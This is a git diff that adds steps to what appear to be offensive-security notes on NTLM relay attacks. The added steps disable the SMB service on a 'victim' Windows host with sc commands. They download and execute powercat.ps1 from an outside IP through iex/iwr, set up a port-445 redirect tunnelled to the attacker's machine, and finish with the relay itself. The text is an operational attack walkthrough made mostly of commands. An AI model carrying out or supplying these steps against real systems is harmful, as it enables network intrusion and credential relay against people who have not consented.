@@ -47,3 +47,18 @@ Mostly be used for NTLM Relay attacks, first step is to allow inbound and outbou
 ### Using Powershell:
 - `New-NetFirewallRule -DisplayName "Allow Port 445 Inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow`
 - `New-NetFirewallRule -DisplayName "Allow Port 445 Outbound" -Direction Outbound -Protocol TCP -RemotePort 445 -Action Allow`
+
+Now, we will need to disable the SMB port on the victim: 
+*Note: Run one by one in CMD, no powershell!)*
+
+    1. `sc config LanmanServer start= disabled`
+    2. `sc stop LanmanServer`
+    3. `sc stop srv2`
+    4. `sc stop srvnet`
+
+Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -useb)` and run:
+- `powercat -l -p 445 -r tcp:<PARROT IP>:445 -rep`
+
+Once it's running we can check if the victim are listening on port 445: `netstat -anto | findstr 445`
+
+Last step is to perform the Relay and see the callback to our machine on port 445 tunneled from the victim!
